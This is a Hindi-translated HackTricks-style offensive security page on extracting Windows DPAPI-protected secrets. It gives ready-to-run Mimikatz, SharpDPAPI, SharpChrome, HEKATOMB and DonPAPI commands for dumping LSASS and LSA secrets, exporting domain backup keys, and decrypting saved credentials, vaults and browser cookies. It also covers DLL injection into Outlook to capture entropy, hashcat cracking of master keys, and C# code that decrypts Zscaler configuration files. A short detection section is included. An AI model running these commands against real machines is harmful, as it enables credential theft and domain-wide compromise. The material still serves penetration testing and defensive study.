# DPAPI - पासवर्ड निकालना

{{#include ../../banners/hacktricks-training.md}}



## DPAPI क्या है

The Data Protection API (DPAPI) का उपयोग मुख्य रूप से Windows ऑपरेटिंग सिस्टम में asymmetric private keys के **symmetric encryption** के लिए किया जाता है, जो entropy के स्रोत के रूप में या तो user या system secrets का उपयोग करता है। यह तरीका डेवलपर्स के लिए एन्क्रिप्शन को सरल बनाता है क्योंकि यह उन्हें उपयोगकर्ता के logon secrets से प्राप्त कुंजी या system encryption के लिए सिस्टम के domain authentication secrets से प्राप्त कुंजी का उपयोग करके डेटा एन्क्रिप्ट करने देता है, जिससे डेवलपर्स को स्वयं एन्क्रिप्शन कुंजी की सुरक्षा संभालने की आवश्यकता नहीं रहती।

DPAPI का सबसे सामान्य उपयोग तरीका **`CryptProtectData` and `CryptUnprotectData`** फंक्शन्स के माध्यम से है, जो एप्लिकेशन्स को उस प्रोसेस के सेशन के साथ सुरक्षित रूप से डेटा एन्क्रिप्ट और डिक्रिप्ट करने की अनुमति देते हैं जो वर्तमान में लॉग ऑन है। इसका अर्थ है कि एन्क्रिप्ट किया गया डेटा केवल उसी उपयोगकर्ता या सिस्टम द्वारा डिक्रिप्ट किया जा सकता है जिसने इसे एन्क्रिप्ट किया था।

इसके अलावा, ये फंक्शन्स एक **`entropy` parameter** भी स्वीकार करते हैं जो एन्क्रिप्शन और डिक्रिप्शन के दौरान उपयोग किया जाता है, इसलिए किसी चीज़ को डिक्रिप्ट करने के लिए जो इस पैरामीटर के साथ एन्क्रिप्ट की गई थी, आपको वही entropy value प्रदान करनी होगी जो एन्क्रिप्शन के दौरान उपयोग की गई थी।

### उपयोगकर्ता कुंजी निर्माण

DPAPI प्रत्येक उपयोगकर्ता के लिए उनकी क्रेडेंशियल्स के आधार पर एक अनूठी कुंजी (जिसे **`pre-key`** कहा जाता है) बनाता है। यह कुंजी उपयोगकर्ता के पासवर्ड और अन्य कारकों से व्युत्पन्न होती है और एल्गोरिद्म उपयोगकर्ता के प्रकार पर निर्भर करता है पर अंततः यह SHA1 बनकर निकलती है। उदाहरण के लिए, domain उपयोगकर्ताओं के लिए, **यह उपयोगकर्ता के NTLM hash पर निर्भर करता है**।

यह विशेष रूप से दिलचस्प है क्योंकि अगर एक attacker उपयोगकर्ता का password hash प्राप्त कर लेता है, तो वे:

- **DPAPI का उपयोग करके एन्क्रिप्ट किए गए किसी भी डेटा को डिक्रिप्ट कर सकते हैं** उस उपयोगकर्ता की कुंजी के साथ बिना किसी API से संपर्क किए
- valid DPAPI key जेनरेट करने की कोशिश करते हुए ऑफ़लाइन **पासवर्ड क्रैक करने** का प्रयास कर सकते हैं

इसके अलावा, हर बार जब कोई उपयोगकर्ता DPAPI का उपयोग करके कुछ डेटा एन्क्रिप्ट करता है, तो एक नई **master key** जेनरेट की जाती है। यही master key वास्तविक रूप से डेटा को एन्क्रिप्ट करने के लिए उपयोग की जाती है। प्रत्येक master key को इसे पहचानने के लिए एक **GUID** (Globally Unique Identifier) दिया जाता है।

Master keys **`%APPDATA%\Microsoft\Protect\<sid>\<guid>`** डायरेक्टरी में संग्रहीत होते हैं, जहाँ `{SID}` उस उपयोगकर्ता का Security Identifier है। master key उपयोगकर्ता की **`pre-key`** द्वारा एन्क्रिप्टेड रूप में संग्रहीत की जाती है और रिकवरी के लिए एक **domain backup key** द्वारा भी एन्क्रिप्ट की जाती है (इसलिए वही कुंजी 2 अलग-अलग पास से 2 बार एन्क्रिप्टेड रूप में संग्रहीत की जाती है)।

ध्यान दें कि **master key को एन्क्रिप्ट करने के लिए उपयोग की जाने वाली domain key डोमेन कंट्रोलर्स में होती है और कभी नहीं बदलती**, इसलिए यदि एक attacker के पास domain controller तक पहुँच है, तो वे domain backup key पुनः प्राप्त कर सकते हैं और डोमेन में सभी उपयोगकर्ताओं की master keys को डिक्रिप्ट कर सकते हैं।

एन्क्रिप्टेड blobs में हेडर में उस master key का **GUID** होता है जिसका उपयोग डेटा को एन्क्रिप्ट करने के लिए किया गया था।

> [!TIP]
> DPAPI encrypted blobs starts with **`01 00 00 00`**

मास्टर कीज़ खोजें:
```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```
This is what a bunch of Master Keys of a user will looks like:

![](<../../images/image (1121).png>)

### मशीन/सिस्टम की कुंजी जनरेशन

यह वह कुंजी है जिसका उपयोग मशीन द्वारा डेटा एन्क्रिप्ट करने के लिए किया जाता है। यह **DPAPI_SYSTEM LSA secret** पर आधारित है, जो एक विशेष कुंजी है जिस तक केवल SYSTEM user ही पहुँच सकता है। यह कुंजी उन डेटा को एन्क्रिप्ट करने के लिए उपयोग होती है जिन्हें सिस्टम को स्वयं द्वारा एक्सेस करने की आवश्यकता होती है, जैसे मशीन-लेवल credentials या system-wide secrets।

ध्यान दें कि इन कुंजियों **का कोई domain backup नहीं होता** इसलिए ये केवल लोकली ही उपलब्ध होते हैं:

- **Mimikatz** इसे LSA secrets dump करके एक्सेस कर सकता है, कमांड का उपयोग करके: `mimikatz lsadump::secrets`
- यह secret registry के अंदर स्टोर होता है, इसलिए एक administrator **DACL permissions को मॉडिफाई करके इसे एक्सेस कर सकता है**। registry path है: `HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\DPAPI_SYSTEM`


### DPAPI द्वारा संरक्षित डेटा

DPAPI द्वारा संरक्षित निजी डेटा में शामिल हैं:

- Windows creds
- Internet Explorer और Google Chrome के पासवर्ड और ऑटो-कम्प्लीशन डेटा
- Outlook और Windows Mail जैसे एप्लिकेशन्स के लिए ई-मेल और आंतरिक FTP अकाउंट पासवर्ड
- साझा फ़ोल्डरों, संसाधनों, वायरलेस नेटवर्क, और Windows Vault के पासवर्ड, जिनमें एन्क्रिप्शन कीज़ भी शामिल हैं
- रिमोट डेस्कटॉप कनेक्शनों, .NET Passport, और विभिन्न एन्क्रिप्शन व ऑथेंटिकेशन प्रयोजनों के लिए प्राइवेट कीज़ के पासवर्ड
- Credential Manager द्वारा प्रबंधित नेटवर्क पासवर्ड और CryptProtectData का उपयोग करने वाले एप्लिकेशन्स (जैसे Skype, MSN messenger आदि) में व्यक्तिगत डेटा
- रजिस्टर के अंदर एन्क्रिप्टेड blobs
- ...

सिस्टम द्वारा संरक्षित डेटा में शामिल हैं:
- Wifi पासवर्ड
- Scheduled task पासवर्ड
- ...

### मास्टर की निकालने के विकल्प

- यदि उपयोगकर्ता के पास domain admin privileges हैं, तो वे domain में सभी यूजर मास्टर कीज़ को डिक्रिप्ट करने के लिए **domain backup key** तक पहुँच सकते हैं:
```bash
# Mimikatz
lsadump::backupkeys /system:<DOMAIN CONTROLLER> /export

# SharpDPAPI
SharpDPAPI.exe backupkey [/server:SERVER.domain] [/file:key.pvk]
```
- With local admin privileges, यह संभव है कि **LSASS memory तक पहुँच** कर सभी जुड़े हुए उपयोगकर्ताओं के DPAPI master keys और SYSTEM key को निकाल लिया जा सके।
```bash
# Mimikatz
mimikatz sekurlsa::dpapi
```
- यदि उपयोगकर्ता के पास स्थानीय व्यवस्थापक विशेषाधिकार हैं, तो वे **DPAPI_SYSTEM LSA secret** तक पहुँच सकते हैं और मशीन मास्टर कुंजियों को डिक्रिप्ट कर सकते हैं:
```bash
# Mimikatz
lsadump::secrets /system:DPAPI_SYSTEM /export
```
- यदि उपयोगकर्ता का पासवर्ड या NTLM हैश ज्ञात है, आप उपयोगकर्ता की मास्टर कुंजियों को सीधे **डिक्रिप्ट कर सकते हैं**:
```bash
# Mimikatz
dpapi::masterkey /in:<C:\PATH\MASTERKEY_LOCATON> /sid:<USER_SID> /password:<USER_PLAINTEXT> /protected

# SharpDPAPI
SharpDPAPI.exe masterkeys /password:PASSWORD
```
- अगर आप user के रूप में एक session के अंदर हैं, तो DC से **backup key to decrypt the master keys using RPC** माँगना संभव है। अगर आप local admin हैं और user logged in है, तो आप इसके लिए **steal his session token** कर सकते हैं:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
## वॉल्ट सूचीबद्ध करें
```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```
## DPAPI एन्क्रिप्टेड डेटा तक पहुँच

### DPAPI एन्क्रिप्टेड डेटा खोजें

सामान्य उपयोगकर्ताओं की **सुरक्षित फ़ाइलें** निम्नलिखित स्थानों पर होती हैं:

- `C:\Users\username\AppData\Roaming\Microsoft\Protect\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Credentials\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Vault\*`
- ऊपर दिए गए paths में `\Roaming\` को `\Local\` से बदलकर भी जाँचें।

Enumeration examples:
```bash
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
[**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI) DPAPI एन्क्रिप्टेड ब्लॉब्स को फ़ाइल सिस्टम, रेजिस्ट्री और B64 ब्लॉब्स में ढूंढ सकता है:
```bash
# Search blobs in the registry
search /type:registry [/path:HKLM] # Search complete registry by default

# Search blobs in folders
search /type:folder /path:C:\path\to\folder
search /type:folder /path:C:\Users\username\AppData\

# Search a blob inside a file
search /type:file /path:C:\path\to\file

# Search a blob inside B64 encoded data
search /type:base64 [/base:<base64 string>]
```
ध्यान दें कि [**SharpChrome**](https://github.com/GhostPack/SharpDPAPI) (इसी रिपॉजिटरी से) DPAPI का उपयोग करके cookies जैसे संवेदनशील डेटा को decrypt करने के लिए इस्तेमाल किया जा सकता है।

### एक्सेस कीज़ और डेटा

- **Use SharpDPAPI** वर्तमान session से DPAPI encrypted फ़ाइलों से credentials प्राप्त करने के लिए:
```bash
# Decrypt user data
## Note that 'triage' is like running credentials, vaults, rdg and certificates
SharpDPAPI.exe [credentials|vaults|rdg|keepass|certificates|triage] /unprotect

# Decrypt machine data
SharpDPAPI.exe machinetriage
```
- **credentials की जानकारी प्राप्त करें** जैसे कि encrypted data और guidMasterKey।
```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```
- **Access masterkeys**:

RPC का उपयोग करके उस उपयोगकर्ता के masterkey को Decrypt करें जो **domain backup key** का अनुरोध कर रहा है:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
The **SharpDPAPI** टूल मास्टरकी डिक्रिप्शन के लिए इन आर्गुमेंट्स का भी समर्थन करता है (ध्यान दें कि `/rpc` का उपयोग डोमेन की बैकअप कुंजी प्राप्त करने के लिए, `/password` का उपयोग सादा टेक्स्ट पासवर्ड देने के लिए, या `/pvk` का उपयोग DPAPI डोमेन निजी कुंजी फ़ाइल निर्दिष्ट करने के लिए किया जा सकता है...):
```
/target:FILE/folder     -   triage a specific masterkey, or a folder full of masterkeys (otherwise triage local masterkeys)
/pvk:BASE64...          -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk            -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X             -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X                 -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X              -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                    -   decrypt the target user's masterkeys by asking domain controller to do so
/server:SERVER          -   triage a remote server, assuming admin access
/hashes                 -   output usermasterkey file 'hashes' in JTR/Hashcat format (no decryption)
```
- **डेटा को masterkey का उपयोग करके Decrypt करें**:
```bash
# Mimikatz
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>

# SharpDPAPI
SharpDPAPI.exe /target:<FILE/folder> /ntlm:<NTLM_HASH>
```
The **SharpDPAPI** टूल ये तर्क भी समर्थन करता है `credentials|vaults|rdg|keepass|triage|blob|ps` डिक्रिप्शन के लिए (ध्यान दें कि `/rpc` का उपयोग domains backup key प्राप्त करने के लिए, `/password` का उपयोग एक plaintext password के रूप में करने के लिए, `/pvk` एक DPAPI domain private key फ़ाइल निर्दिष्ट करने के लिए, `/unprotect` वर्तमान उपयोगकर्ता के session का उपयोग करने के लिए संभव है...):
```
Decryption:
/unprotect          -   force use of CryptUnprotectData() for 'ps', 'rdg', or 'blob' commands
/pvk:BASE64...      -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk        -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X         -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X             -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X          -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                -   decrypt the target user's masterkeys by asking domain controller to do so
GUID1:SHA1 ...      -   use a one or more GUID:SHA1 masterkeys for decryption
/mkfile:FILE        -   use a file of one or more GUID:SHA1 masterkeys for decryption

Targeting:
/target:FILE/folder -   triage a specific 'Credentials','.rdg|RDCMan.settings', 'blob', or 'ps' file location, or 'Vault' folder
/server:SERVER      -   triage a remote server, assuming admin access
Note: must use with /pvk:KEY or /password:X
Note: not applicable to 'blob' or 'ps' commands
```
- कुछ डेटा **वर्तमान उपयोगकर्ता सत्र** का उपयोग करके डीक्रिप्ट करें:
```bash
# Mimikatz
dpapi::blob /in:C:\path\to\encrypted\file /unprotect

# SharpDPAPI
SharpDPAPI.exe blob /target:C:\path\to\encrypted\file /unprotect
```
---
### वैकल्पिक एंट्रॉपी ("थर्ड-पार्टी एंट्रॉपी") को संभालना

कुछ एप्लिकेशन `CryptProtectData` को अतिरिक्त **entropy** मान पास करते हैं। इस मान के बिना blob को डिक्रिप्ट नहीं किया जा सकता, भले ही सही masterkey ज्ञात हो। इसलिए इस तरह सुरक्षित क्रेडेंशियल्स को लक्षित करते समय **entropy** प्राप्त करना आवश्यक है (जैसे Microsoft Outlook, कुछ VPN क्लाइंट)।

[**EntropyCapture**](https://github.com/SpecterOps/EntropyCapture) (2022) एक user-mode DLL है जो target process के अंदर DPAPI फ़ंक्शन्स को hook करके सप्लाई की गई किसी भी वैकल्पिक **entropy** को पारदर्शी रूप से रिकॉर्ड करता है। `outlook.exe` या `vpnclient.exe` जैसे प्रोसेसों के खिलाफ **DLL-injection** मोड में EntropyCapture चलाने पर एक फाइल आउटपुट होगी जो हर entropy buffer को कॉल करने वाली प्रोसेस और blob से मैप करती है। कैप्चर की गई **entropy** को बाद में **SharpDPAPI** (`/entropy:`) या **Mimikatz** (`/entropy:<file>`) को प्रदान करके डेटा को डिक्रिप्ट किया जा सकता है।
```powershell
# Inject EntropyCapture into the current user's Outlook
InjectDLL.exe -pid (Get-Process outlook).Id -dll EntropyCapture.dll

# Later decrypt a credential blob that required entropy
SharpDPAPI.exe blob /target:secret.cred /entropy:entropy.bin /ntlm:<hash>
```
### Cracking masterkeys offline (Hashcat & DPAPISnoop)

Microsoft ने Windows 10 v1607 (2016) से एक **context 3** masterkey format पेश किया। `hashcat` v6.2.6 (December 2023) ने hash-modes **22100** (DPAPI masterkey v1 context), **22101** (context 1) और **22102** (context 3) जोड़े, जो masterkey file से user passwords का सीधे GPU-accelerated cracking करने की अनुमति देते हैं। इसलिए attackers target system से interact किए बिना word-list या brute-force attacks कर सकते हैं।

`DPAPISnoop` (2024) इस प्रक्रिया को automate करता है:
```bash
# Parse a whole Protect folder, generate hashcat format and crack
DPAPISnoop.exe masterkey-parse C:\Users\bob\AppData\Roaming\Microsoft\Protect\<sid> --mode hashcat --outfile bob.hc
hashcat -m 22102 bob.hc wordlist.txt -O -w4
```
यह टूल Credential और Vault blobs को पार्स कर सकता है, cracked keys के साथ उन्हें decrypt कर सकता है और cleartext passwords को export कर सकता है।


### अन्य मशीन का डेटा एक्सेस करें

आप **SharpDPAPI और SharpChrome** में रिमोट मशीन का डेटा एक्सेस करने के लिए **`/server:HOST`** विकल्प निर्दिष्ट कर सकते हैं। बेशक आपको उस मशीन तक पहुँच होना चाहिए और निम्न उदाहरण में यह माना गया है कि **domain backup encryption key is known**:
```bash
SharpDPAPI.exe triage /server:HOST /pvk:BASE64
SharpChrome cookies /server:HOST /pvk:BASE64
```
## Other tools

### HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) एक टूल है जो LDAP डायरेक्टरी से सभी यूज़र्स और कंप्यूटर्स के एक्सट्रैक्शन और RPC के माध्यम से domain controller backup key के एक्सट्रैक्शन को ऑटोमेट करता है। स्क्रिप्ट फिर सभी कंप्यूटर्स के IP पते रिज़ॉल्व करेगी और smbclient पर सभी कम्प्यूटर्स से सभी यूज़र्स के DPAPI ब्लॉब्स प्राप्त कर के domain backup key से सब कुछ डिक्रिप्ट कर देगी।

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

LDAP से निकाली हुई कंप्यूटर्स की सूची के साथ आप हर सब-नेटवर्क ढूँढ सकते हैं भले ही आप उन्हें पहले नहीं जानते थे!

### DonPAPI 2.x (2024-05)

[**DonPAPI**](https://github.com/login-securite/DonPAPI) DPAPI द्वारा सुरक्षित गुप्त जानकारी को स्वचालित रूप से डंप कर सकता है। 2.x रिलीज़ में शामिल हैं:

* सैकड़ों होस्ट्स से blobs का पैरेलल कलेक्शन
* context 3 masterkeys का पार्सिंग और Hashcat क्रैकिंग का ऑटोमैटिक इंटीग्रेशन
* Chrome "App-Bound" एन्क्रिप्टेड कुकीज़ के लिए सपोर्ट (अगले सेक्शन देखें)
* एक नया **`--snapshot`** मोड जो endpoints को बार-बार पोल कर के नव-निर्मित ब्लॉब्स का diff निकालता है

### DPAPISnoop

[**DPAPISnoop**](https://github.com/Leftp/DPAPISnoop) masterkey/credential/vault फाइलों के लिए एक C# पार्सर है जो Hashcat/JtR फॉर्मैट आउटपुट कर सकता है और वैकल्पिक रूप से क्रैकिंग को ऑटोमैटिकली इनवोकेट कर सकता है। यह Windows 11 24H1 तक के machine और user masterkey फॉर्मैट्स को पूरी तरह सपोर्ट करता है।


## Common detections

- `C:\Users\*\AppData\Roaming\Microsoft\Protect\*`, `C:\Users\*\AppData\Roaming\Microsoft\Credentials\*` और अन्य DPAPI-संबंधित डायरेक्टरीज़ में फ़ाइलों तक पहुँच।
- खासकर नेटवर्क शेयर जैसे **C$** या **ADMIN$** से।
- LSASS memory तक पहुँचने या masterkeys dump करने के लिए **Mimikatz**, **SharpDPAPI** या समान टूलिंग का उपयोग।
- Event **4662**: *An operation was performed on an object* – इसे **`BCKUPKEY`** ऑब्जेक्ट तक पहुँच के साथ correlate किया जा सकता है।
- Event **4673/4674** जब कोई प्रोसेस *SeTrustedCredManAccessPrivilege* (Credential Manager) माँगता है।

---
### 2023-2025 vulnerabilities & ecosystem changes

* **CVE-2023-36004 – Windows DPAPI Secure Channel Spoofing** (November 2023). नेटवर्क एक्सेस वाला एक हमला करने वाला डोमेन सदस्य को धोखा देकर एक malicious DPAPI backup key प्राप्त करवा सकता था, जिससे user masterkeys का डिक्रिप्शन संभव हो जाता। यह नवंबर 2023 के cumulative update में पैच किया गया — एडमिनिस्ट्रेटर्स को सुनिश्चित करना चाहिए कि DCs और वर्कस्टेशंस पूरी तरह पैच्ड हैं।
* **Chrome 127 “App-Bound” cookie encryption** (July 2024) ने legacy DPAPI-only प्रोटेक्शन को बदलकर एक अतिरिक्त key जोड़ दी जो user के **Credential Manager** में स्टोर रहती है। अब कुकीज़ का offline डिक्रिप्शन दोनों — DPAPI masterkey और **GCM-wrapped app-bound key** — की आवश्यकता करता है। SharpChrome v2.3 और DonPAPI 2.x user context में चलने पर अतिरिक्त key रिकवर करने में सक्षम हैं।


### Case Study: Zscaler Client Connector – Custom Entropy Derived From SID

Zscaler Client Connector कई configuration फाइलें `C:\ProgramData\Zscaler` के अंतर्गत स्टोर करता है (उदा. `config.dat`, `users.dat`, `*.ztc`, `*.mtt`, `*.mtc`, `*.mtp`)। प्रत्येक फ़ाइल **DPAPI (Machine scope)** से एन्क्रिप्टेड है पर विक्रेता **custom entropy** प्रदान करता है जो डिस्क पर स्टोर किए जाने के बजाय *runtime पर गणना* की जाती है।

Entropy दो तत्वों से पुनर्निर्मित की जाती है:

1. `ZSACredentialProvider.dll` के अंदर एम्बेड एक हार्ड-कोडेड सीक्रेट।
2. उस Windows account की **SID** जिससे कॉन्फ़िगरेशन संबंधित है।

DLL द्वारा लागू एल्गोरिथ्म इसके समकक्ष है:
```csharp
byte[] secret = Encoding.UTF8.GetBytes(HARDCODED_SECRET);
byte[] sid    = Encoding.UTF8.GetBytes(CurrentUserSID);

// XOR the two buffers byte-by-byte
byte[] tmp = new byte[secret.Length];
for (int i = 0; i < secret.Length; i++)
tmp[i] = (byte)(sid[i] ^ secret[i]);

// Split in half and XOR both halves together to create the final entropy buffer
byte[] entropy = new byte[tmp.Length / 2];
for (int i = 0; i < entropy.Length; i++)
entropy[i] = (byte)(tmp[i] ^ tmp[i + entropy.Length]);
```
क्योंकि सीक्रेट एक DLL में एम्बेड है जिसे डिस्क से पढ़ा जा सकता है, **any local attacker with SYSTEM rights can regenerate the entropy for any SID** and decrypt the blobs offline:
```csharp
byte[] blob = File.ReadAllBytes(@"C:\ProgramData\Zscaler\<SID>++config.dat");
byte[] clear = ProtectedData.Unprotect(blob, RebuildEntropy(secret, sid), DataProtectionScope.LocalMachine);
Console.WriteLine(Encoding.UTF8.GetString(clear));
```
डिक्रिप्शन पूर्ण JSON कॉन्फ़िगरेशन देता है, जिसमें हर **device posture check** और इसका अपेक्षित मान शामिल होता है – ऐसी जानकारी क्लाइंट-साइड बायपास प्रयासों के दौरान बहुत मूल्यवान होती है।

> TIP: अन्य एनक्रिप्टेड आर्टिफैक्ट्स (`*.mtt`, `*.mtp`, `*.mtc`, `*.ztc`) DPAPI के साथ **बिना** entropy (`16` zero bytes) के सुरक्षित होते हैं। इसलिए उन्हें SYSTEM privileges प्राप्त होने पर सीधे `ProtectedData.Unprotect` के साथ डिक्रिप्ट किया जा सकता है।

## References

- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)

- [https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13](https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13)
- [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)
- [https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004)
- [https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html](https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html)
- [https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/](https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/)
- [https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6](https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6)
- [https://github.com/Leftp/DPAPISnoop](https://github.com/Leftp/DPAPISnoop)
- [https://pypi.org/project/donpapi/2.0.0/](https://pypi.org/project/donpapi/2.0.0/)

{{#include ../../banners/hacktricks-training.md}}
